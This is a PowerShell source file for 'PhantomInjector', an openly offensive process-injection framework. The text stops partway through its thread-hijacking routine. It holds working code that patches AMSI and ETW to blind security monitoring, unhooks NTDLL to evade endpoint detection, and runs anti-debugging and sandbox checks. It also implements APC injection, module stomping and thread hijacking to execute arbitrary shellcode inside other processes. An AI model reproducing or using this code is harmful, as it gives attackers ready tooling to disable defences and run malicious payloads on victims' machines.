<#
.SYNOPSIS
    PhantomInjector v1.0 - Advanced in-memory injection framework with enhanced evasion techniques
.DESCRIPTION
    This module implements multiple process injection techniques with improved stealth capabilities:
    - APC Injection (Early Bird + QueueUserAPC)
    - Thread Hijacking with direct syscalls
    - Process Ghosting (no disk writes)
    - AMSI/ETW bypass via unhooking and syscalls
    - NTDLL unhooking from disk
.NOTES
    Author: 0xMaz Mohamed Alzhrani
    Version: 1.0
    Required Dependencies: None
    Supported OS: Windows 10/11, Windows Server 2016+
#>

#region Initialization and Evasion
function Invoke-Initialization {
    # Enable SeDebugPrivilege
    function Enable-SeDebugPrivilege {
        $AdjustTokenPrivileges = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint Zero,
        IntPtr Null1,
        IntPtr Null2);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@

        try {
            Add-Type -TypeDefinition $AdjustTokenPrivileges -ErrorAction Stop
            $currentProcess = [TokenManipulator]::GetCurrentProcess()
            $tokenHandle = [IntPtr]::Zero
            $tokenPrivileges = New-Object TokenManipulator+TOKEN_PRIVILEGES
            $luid = New-Object TokenManipulator+LUID

            if (-not [TokenManipulator]::OpenProcessToken($currentProcess, 0x28, [ref]$tokenHandle)) {
                throw "OpenProcessToken failed"
            }

            if (-not [TokenManipulator]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid)) {
                throw "LookupPrivilegeValue failed"
            }

            $tokenPrivileges.PrivilegeCount = 1
            $tokenPrivileges.Luid = $luid
            $tokenPrivileges.Attributes = 0x2 # SE_PRIVILEGE_ENABLED

            if (-not [TokenManipulator]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
                throw "AdjustTokenPrivileges failed"
            }

            Write-Verbose "[+] SeDebugPrivilege enabled successfully"
        }
        catch {
            Write-Warning "[-] Failed to enable SeDebugPrivilege: $_"
        }
    }

    # AMSI Bypass via patching
    function Invoke-AMSIBypass {
        if (-not $BypassAMSI) { return }

        try {
            $amsiPatch = @"
using System;
using System.Runtime.InteropServices;

public class AMSIPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Disable() {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        IntPtr asbAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
        
        if (asbAddr != IntPtr.Zero) {
            uint oldProtect;
            VirtualProtect(asbAddr, (UIntPtr)5, 0x40, out oldProtect);
            
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
            Marshal.Copy(patch, 0, asbAddr, 6);
            
            VirtualProtect(asbAddr, (UIntPtr)5, oldProtect, out oldProtect);
        }
    }
}
"@
            Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
            [AMSIPatch]::Disable()
            Write-Verbose "[+] AMSI bypass applied successfully"
        }
        catch {
            Write-Warning "[-] AMSI bypass failed: $_"
        }
    }

    # ETW Bypass via patching
    function Invoke-ETWBypass {
        if (-not $BypassETW) { return }

        try {
            $etwPatch = @"
using System;
using System.Runtime.InteropServices;

public class ETWPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Disable() {
        IntPtr hNtdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
        
        if (etwAddr != IntPtr.Zero) {
            uint oldProtect;
            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
            
            byte[] patch = { 0xC3 }; // ret
            Marshal.Copy(patch, 0, etwAddr, 1);
            
            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
        }
    }
}
"@
            Add-Type -TypeDefinition $etwPatch -ErrorAction Stop
            [ETWPatch]::Disable()
            Write-Verbose "[+] ETW bypass applied successfully"
        }
        catch {
            Write-Warning "[-] ETW bypass failed: $_"
        }
    }

    # NTDLL Unhooking from disk
    function Invoke-NTDLLUnhook {
        if (-not $UnhookNTDLL) { return }

        try {
            $unhookCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class NTDLLUnhooker {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

    public static void Unhook() {
        string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string ntdllPath = Path.Combine(system32, "ntdll.dll");
        
        // Load fresh NTDLL from disk
        IntPtr hCleanNtdll = LoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000008); // DONT_RESOLVE_DLL_REFERENCES
        
        if (hCleanNtdll == IntPtr.Zero) return;
        
        // Get hooked NTDLL
        IntPtr hHookedNtdll = GetModuleHandle("ntdll.dll");
        
        // Get export directory
        IntPtr peHeader = (IntPtr)((long)hHookedNtdll + 0x3C);
        IntPtr optHeader = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32(peHeader) + 0x18);
        IntPtr exportDir = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)optHeader + 0x70)));
        
        int numberOfNames = Marshal.ReadInt32((IntPtr)((long)exportDir + 0x18));
        IntPtr namesAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)exportDir + 0x20)));
        
        for (int i = 0; i < numberOfNames; i++) {
            IntPtr nameAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)namesAddr + i * 4)));
            string funcName = Marshal.PtrToStringAnsi(nameAddr);
            
            IntPtr hookedAddr = GetProcAddress(hHookedNtdll, funcName);
            IntPtr cleanAddr = GetProcAddress(hCleanNtdll, funcName);
            
            if (hookedAddr != IntPtr.Zero && cleanAddr != IntPtr.Zero) {
                uint oldProtect;
                if (VirtualProtect(hookedAddr, (UIntPtr)0x20, 0x40, out oldProtect)) {
                    byte[] cleanBytes = new byte[0x20];
                    Marshal.Copy(cleanAddr, cleanBytes, 0, 0x20);
                    Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
                    VirtualProtect(hookedAddr, (UIntPtr)0x20, oldProtect, out oldProtect);
                }
            }
        }
    }
}
"@
            Add-Type -TypeDefinition $unhookCode -ErrorAction Stop
            [NTDLLUnhooker]::Unhook()
            Write-Verbose "[+] NTDLL unhooked successfully"
        }
        catch {
            Write-Warning "[-] NTDLL unhooking failed: $_"
        }
    }

    # Anti-debug checks
    function Test-Debugger {
        try {
            if ([System.Diagnostics.Debugger]::IsAttached) {
                throw "Debugger detected"
            }
            
            # Check if running in common debuggers
			$process = Get-Process -Id $pid
			$debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
            
            $sandboxPaths = @("C:\sample.exe", "C:\malware.exe", "C:\analysis\")
			foreach ($path in $sandboxPaths) {
				if (Test-Path $path) {
					throw "Sandbox detected: $path"
				}
			}
            
            return $true
        }
        catch {
            Write-Warning "[-] Anti-debug check failed: $_"
            exit
        }
    }

    # Execute initialization routines
    Enable-SeDebugPrivilege
    Test-Debugger
    Invoke-AMSIBypass
    Invoke-ETWBypass
    Invoke-NTDLLUnhook
}

#region Injection Methods
function Invoke-APCInjection {
    param(
        [byte[]]$Shellcode,
        [string]$ProcessName,
        [int]$ProcessId
    )

    $apcCode = @"
using System;
using System.Runtime.InteropServices;

public class APCInjector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint QueueUserAPC(
        IntPtr pfnAPC,
        IntPtr hThread,
        IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenThread(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static bool Inject(int processId, byte[] shellcode) {
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint THREAD_ALL_ACCESS = 0x1F03FF;

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);
        if (hProcess == IntPtr.Zero) return false;

        IntPtr allocAddr = VirtualAllocEx(
            hProcess,
            IntPtr.Zero,
            (uint)shellcode.Length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (allocAddr == IntPtr.Zero) {
            CloseHandle(hProcess);
            return false;
        }

        UIntPtr bytesWritten;
        if (!WriteProcessMemory(
                hProcess,
                allocAddr,
                shellcode,
                (uint)shellcode.Length,
                out bytesWritten)) {
            CloseHandle(hProcess);
            return false;
        }

        // Get all threads in the target process
        foreach (System.Diagnostics.ProcessThread thread in System.Diagnostics.Process.GetProcessById(processId).Threads) {
            IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, (uint)thread.Id);
            if (hThread != IntPtr.Zero) {
                QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
                ResumeThread(hThread);
                CloseHandle(hThread);
            }
        }

        CloseHandle(hProcess);
        return true;
    }
}
"@
    try {
        Add-Type -TypeDefinition $apcCode -ErrorAction Stop
        
        if ($ProcessId -eq 0) {
            $targetProcess = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
            $ProcessId = $targetProcess.Id
        }

        if ([APCInjector]::Inject($ProcessId, $Shellcode)) {
            Write-Verbose "[+] APC injection successful"
            return $true
        } else {
            Write-Warning "[-] APC injection failed"
            return $false
        }
    }
    catch {
        Write-Warning "[-] APC injection error: $_"
        return $false
    }
}

function Invoke-ModuleStompingInjection {
    param(
        [byte[]]$Shellcode,
        [string]$ProcessName,
        [int]$ProcessId,
        [int]$TimeoutMS = 2000
    )

    $stompingCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Collections.Generic;
using System.Text;

public class ModuleStomper {
    [StructLayout(LayoutKind.Sequential)]
    public struct MODULEINFO {
        public IntPtr lpBaseOfDll;
        public uint SizeOfImage;
        public IntPtr EntryPoint;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [DllImport("psapi.dll", SetLastError=true)]
    public static extern bool EnumProcessModules(
        IntPtr hProcess,
        [Out] IntPtr[] lphModule,
        uint cb,
        out uint lpcbNeeded);

    [DllImport("psapi.dll", CharSet=CharSet.Auto)]
    public static extern uint GetModuleFileNameEx(
        IntPtr hProcess,
        IntPtr hModule,
        StringBuilder lpFilename,
        uint nSize);

    [DllImport("psapi.dll", SetLastError=true)]
    public static extern bool GetModuleInformation(
        IntPtr hProcess,
        IntPtr hModule,
        out MODULEINFO lpmodinfo,
        uint cb);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenThread(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern uint NtGetContextThread(
        IntPtr ThreadHandle,
        IntPtr Context);

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern uint NtSetContextThread(
        IntPtr ThreadHandle,
        IntPtr Context);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetExitCodeProcess(
        IntPtr hProcess,
        out uint lpExitCode);

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT_X64 {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT_X86 {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public uint FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
    }

    public static bool Inject(int processId, byte[] shellcode, int timeoutMS) {
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint THREAD_ALL_ACCESS = 0x001F03FF;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint STILL_ACTIVE = 0x103;
        const uint CONTEXT_FULL = 0x10007;

        IntPtr hProcess = IntPtr.Zero;
        byte[] originalBytes = null;
        IntPtr targetAddress = IntPtr.Zero;
        uint originalProtection = 0;
        uint exitCode = STILL_ACTIVE;
        UIntPtr bytesWrittenDummy;
        UIntPtr bytesReadDummy;

        try {
            // 1. Open target process
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);
            if (hProcess == IntPtr.Zero) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess failed");
            }

            // 2. Find suitable module for stomping
            IntPtr targetModule = FindSuitableModule(hProcess, shellcode.Length);
            if (targetModule == IntPtr.Zero) {
                throw new Exception("No suitable module found for stomping");
            }

            // 3. Get module information
            MODULEINFO moduleInfo;
            if (!GetModuleInformation(hProcess, targetModule, out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO)))) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "GetModuleInformation failed");
            }

            // 4. Calculate safe injection point at end of module
            targetAddress = new IntPtr(moduleInfo.lpBaseOfDll.ToInt64() + moduleInfo.SizeOfImage - shellcode.Length);
            if (targetAddress.ToInt64() < moduleInfo.lpBaseOfDll.ToInt64()) {
                throw new Exception("Shellcode too large for module");
            }

            // 5. Backup original module bytes
            originalBytes = new byte[shellcode.Length];
            if (!ReadProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesReadDummy)) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "ReadProcessMemory failed");
            }

            // 6. Change protection to RW
            if (!VirtualProtectEx(hProcess, targetAddress, (uint)shellcode.Length, PAGE_READWRITE, out originalProtection)) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualProtectEx failed");
            }

            // 7. Write shellcode
            if (!WriteProcessMemory(hProcess, targetAddress, shellcode, (uint)shellcode.Length, out bytesWrittenDummy)) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");
            }

            // 8. Restore original protection
            uint dummyProtect;
            if (!VirtualProtectEx(hProcess, targetAddress, (uint)shellcode.Length, PAGE_EXECUTE_READ, out dummyProtect)) {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "VirtualProtectEx restore failed");
            }

            // 9. Get process threads
            var process = Process.GetProcessById(processId);
            if (process.Threads.Count == 0) {
                throw new Exception("No threads found in target process");
            }

            // 10. Try to hijack a thread
            bool threadHijacked = false;
            foreach (ProcessThread thread in process.Threads) {
                IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, (uint)thread.Id);
                if (hThread == IntPtr.Zero) continue;

                try {
                    if (SuspendThread(hThread) == 0xFFFFFFFF) continue;

                    // Get architecture
                    bool is64Bit = (IntPtr.Size == 8);
                    IntPtr contextPtr = IntPtr.Zero;
                    int contextSize = is64Bit ? Marshal.SizeOf(typeof(CONTEXT_X64)) : Marshal.SizeOf(typeof(CONTEXT_X86));
                    
                    try {
                        contextPtr = Marshal.AllocHGlobal(contextSize);
                        if (is64Bit) {
                            var context = new CONTEXT_X64();
                            context.ContextFlags = CONTEXT_FULL;
                            Marshal.StructureToPtr(context, contextPtr, false);
                        } else {
                            var context = new CONTEXT_X86();
                            context.ContextFlags = CONTEXT_FULL;
                            Marshal.StructureToPtr(context, contextPtr, false);
                        }
                        
                        // Use native API for reliability
                        uint status = NtGetContextThread(hThread, contextPtr);
                        if (status != 0) continue;

                        // Backup original instruction pointer
                        IntPtr originalIP = IntPtr.Zero;
                        if (is64Bit) {
                            var context = (CONTEXT_X64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X64));
                            originalIP = new IntPtr((long)context.Rip);
                            context.Rip = (ulong)targetAddress.ToInt64();
                            Marshal.StructureToPtr(context, contextPtr, false);
                        } else {
                            var context = (CONTEXT_X86)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X86));
                            originalIP = new IntPtr(context.Eip);
                            context.Eip = (uint)targetAddress.ToInt32();
                            Marshal.StructureToPtr(context, contextPtr, false);
                        }

                        // Set new context
                        status = NtSetContextThread(hThread, contextPtr);
                        if (status != 0) continue;

                        // Create restoration thread
                        System.Threading.ThreadPool.QueueUserWorkItem(state => {
                            try {
                                System.Threading.Thread.Sleep(timeoutMS);
                                
                                // Check if process still exists
                                if (!GetExitCodeProcess(hProcess, out exitCode) || exitCode != STILL_ACTIVE) return;
                                
                                if (SuspendThread(hThread) != 0xFFFFFFFF) {
                                    // Restore original memory
                                    uint tempProt;
                                    VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, PAGE_READWRITE, out tempProt);
                                    WriteProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesWrittenDummy);
                                    VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, originalProtection, out tempProt);
                                    
                                    // Restore original context
                                    if (is64Bit) {
                                        var context = (CONTEXT_X64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X64));
                                        context.Rip = (ulong)originalIP.ToInt64();
                                        Marshal.StructureToPtr(context, contextPtr, false);
                                        NtSetContextThread(hThread, contextPtr);
                                    } else {
                                        var context = (CONTEXT_X86)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT_X86));
                                        context.Eip = (uint)originalIP.ToInt32();
                                        Marshal.StructureToPtr(context, contextPtr, false);
                                        NtSetContextThread(hThread, contextPtr);
                                    }
                                    
                                    ResumeThread(hThread);
                                }
                            }
                            catch { /* Suppress errors during cleanup */ }
                            finally {
                                CloseHandle(hThread);
                            }
                        });

                        ResumeThread(hThread);
                        threadHijacked = true;
                        break;
                    }
                    finally {
                        if (contextPtr != IntPtr.Zero) 
                            Marshal.FreeHGlobal(contextPtr);
                    }
                }
                catch {
                    // Ensure thread is resumed on error
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                }
            }

            if (!threadHijacked) {
                throw new Exception("Failed to hijack any thread");
            }

            return true;
        }
        catch (Exception ex) {
            // Emergency restoration if process is still alive
            if (hProcess != IntPtr.Zero && GetExitCodeProcess(hProcess, out exitCode) && exitCode == STILL_ACTIVE) {
                try {
                    if (originalBytes != null && targetAddress != IntPtr.Zero) {
                        uint tempProt;
                        VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, PAGE_READWRITE, out tempProt);
                        WriteProcessMemory(hProcess, targetAddress, originalBytes, (uint)originalBytes.Length, out bytesWrittenDummy);
                        VirtualProtectEx(hProcess, targetAddress, (uint)originalBytes.Length, originalProtection, out tempProt);
                    }
                } catch {}
            }
            throw new Exception("Injection failed: " + ex.Message);
        }
        finally {
            if (hProcess != IntPtr.Zero) 
                CloseHandle(hProcess);
        }
    }

    private static IntPtr FindSuitableModule(IntPtr hProcess, int minSize) {
        IntPtr[] moduleHandles = new IntPtr[1024];
        uint cbNeeded;
        if (!EnumProcessModules(hProcess, moduleHandles, (uint)(moduleHandles.Length * IntPtr.Size), out cbNeeded)) {
            return IntPtr.Zero;
        }

        int moduleCount = (int)(cbNeeded / IntPtr.Size);
        string[] excludedModules = { 
            "ntdll.dll", "kernel32.dll", "kernelbase.dll", 
            "mscoree.dll", "KERNELBASE.dll", "msvcrt.dll",
            "user32.dll", "gdi32.dll", "combase.dll",
            "advapi32.dll", "sechost.dll", "rpcrt4.dll"
        };

        for (int i = 0; i < moduleCount; i++) {
            var moduleName = new StringBuilder(260);
            if (GetModuleFileNameEx(hProcess, moduleHandles[i], moduleName, (uint)moduleName.Capacity) == 0) {
                continue;
            }

            string fileName = System.IO.Path.GetFileName(moduleName.ToString()).ToLower();
            bool isExcluded = false;
            foreach (string excluded in excludedModules) {
                if (fileName == excluded.ToLower()) {
                    isExcluded = true;
                    break;
                }
            }

            if (isExcluded) continue;

            MODULEINFO moduleInfo;
            if (!GetModuleInformation(hProcess, moduleHandles[i], out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO)))) {
                continue;
            }

            // Ensure module is large enough and has space at the end
            if (moduleInfo.SizeOfImage > minSize && moduleInfo.SizeOfImage > 4096) {
                return moduleHandles[i];
            }
        }

        return IntPtr.Zero;
    }
}
"@

    try {
        Add-Type -TypeDefinition $stompingCode -ErrorAction Stop
        
        if ($ProcessId -eq 0) {
            $targetProcess = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
            $ProcessId = $targetProcess.Id
        }

        Write-Verbose "Attempting module stomping injection on PID: $ProcessId with ${TimeoutMS}ms timeout"
        
        $result = [ModuleStomper]::Inject($ProcessId, $Shellcode, $TimeoutMS)
        
        if ($result) {
            Write-Verbose "[+] Module stomping injection completed"
            return $true
        } else {
            Write-Warning "[-] Module stomping injection failed"
            return $false
        }
    }
    catch {
        Write-Warning "[-] Module stomping error: $_"
        return $false
    }
}


function Invoke-ThreadHijack {
    param(
        [byte[]]$Shellcode,
        [string]$ProcessName,
        [int]$ProcessId,
        [int]$TimeoutMS = 20000
    )

    $hijackCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ThreadHijacker {
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static bool SafeHijack(int processId, byte[] shellcode, int timeoutMS) {
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint THREAD_ALL_ACCESS = 0x1F03FF;
        const uint CONTEXT_FULL = 0x10007;
        //const uint WAIT_TIMEOUT = 0x102;

        IntPtr hProcess = IntPtr.Zero;
        IntPtr allocAddr = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;

        try {
            // 1. Open target process
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processId);
            if (hProcess == IntPtr.Zero) return false;

            // 2. Allocate memory with RW -> RX protection change
            allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 
                0x3000, 0x04); // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE

            if (allocAddr == IntPtr.Zero) return false;

            // 3. Write shellcode
            UIntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, allocAddr, shellcode, (uint)shellcode.Length, out bytesWritten))
                return false;

            // 4. Change protection to RX
            uint oldProtect;
            if (!VirtualProtectEx(hProcess, allocAddr, (uint)shellcode.Length, 0x20, out oldProtect))
                return false;

            // 5. Find a suitable thread
            var process = Process.GetProcessById(processId);
            foreach (ProcessThread thread in process.Threads) {
                hThread = OpenThread(THREAD_ALL_ACCESS, false, (uint)thread.Id);
                if (hThread == IntPtr.Zero) continue;

                // 6. Suspend and hijack
                if (SuspendThread(hThread) != 0xFFFFFFFF) {
                    CONTEXT context = new CONTEXT();
                    context.ContextFlags = CONTEXT_FULL;

                    if (GetThreadContext(hThread, ref context)) {
                        // Save original context
                        ulong originalRip = context.Rip;
                        ulong originalRsp = context.Rsp;

                        // Setup stack and execution
                        context.Rsp -= 0x128; // Create stack space
                        context.Rip = (ulong)allocAddr;

                        if (SetThreadContext(hThread, ref context)) {
                            // Create waiter thread to restore context
